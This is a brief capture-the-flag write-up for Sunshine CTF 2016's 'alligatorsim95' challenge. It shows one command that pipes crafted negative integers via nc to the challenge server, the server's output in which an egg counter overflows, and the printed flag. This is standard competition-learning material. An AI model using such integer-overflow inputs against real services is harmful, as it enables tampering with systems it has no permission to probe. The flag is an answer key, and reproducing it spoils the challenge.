---
title:   "Write-up - Sunshine CTF 2016 - alligatorsim95"
date:    2016-03-14 00:00:00
tags:    [Write-up, Sunshine CTF 2016]
summary: "Write-up about Sunshine CTF 2016 - alligatorsim95"
---

```
➜  Desktop python -c "print -1337; print -0xffffffff; print -1" | nc 4.31.182.242 9000 # integer underflow
              .-._   _ _ _ _ _ _ _ _
   .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
  '.___ '    .   .--_'-' '-' '-' _'-' '._
   V: V 'vv-'   '_   '.       .'  _..' '.'.
     '=.____.=_.--'   :_.__.__:_   '.   : :
             (((____.-'        '-.  /   : :
   snd                         (((-' .' /
                             _____..'  .'
                            '-._____.-'
  -> welcome to alligatorsim95!

-> u r... AN ALLIGATOR!!
.. simulating alligator lifecycle ..
.. simulating alligator throwing physics..
-> you got 1337 eggz in ur nest, how many you gonna lay alligator?? ~~ producing eggz ~~
.. simulating alligator lifecycle ..
.. simulating alligator throwing physics..
-> you got 0 eggz in ur nest, how many you gonna lay alligator?? ~~ producing eggz ~~
.. simulating alligator lifecycle ..
.. simulating alligator throwing physics..
-> you got -2147483648 eggz in ur nest, how many you gonna lay alligator?? ~~ producing eggz ~~
-> dang 2147483647 is a lotta eggs
-> as a god among gators here is ur crown:
sun{int_0verflow_i5_a_g0od_st4rt}
```
